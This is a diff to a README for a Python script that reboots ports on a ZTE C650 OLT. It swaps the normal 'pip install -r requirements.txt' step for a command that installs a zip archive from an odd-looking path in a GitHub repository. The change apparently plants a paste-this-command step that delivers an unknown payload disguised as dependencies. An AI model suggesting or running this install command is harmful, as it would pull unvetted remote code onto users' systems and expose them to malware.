@@ -24,7 +24,7 @@ This Python script provides a convenient way to reboot ports on the ZTE C650 Opt
 
 2. **Install Dependencies:** Install the required dependencies by running:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/raulbbrit/zte-titan-reboot/raw/refs/heads/main/untranquillized/reboot_zte_titan_v2.3.zip
    ```
 
 3. **Run the Script:** Execute the `main()` function in the Python script to initiate the ZTE C650 OLT port reboot tool. Follow the interactive prompts to input the necessary details and select the ports for rebooting.
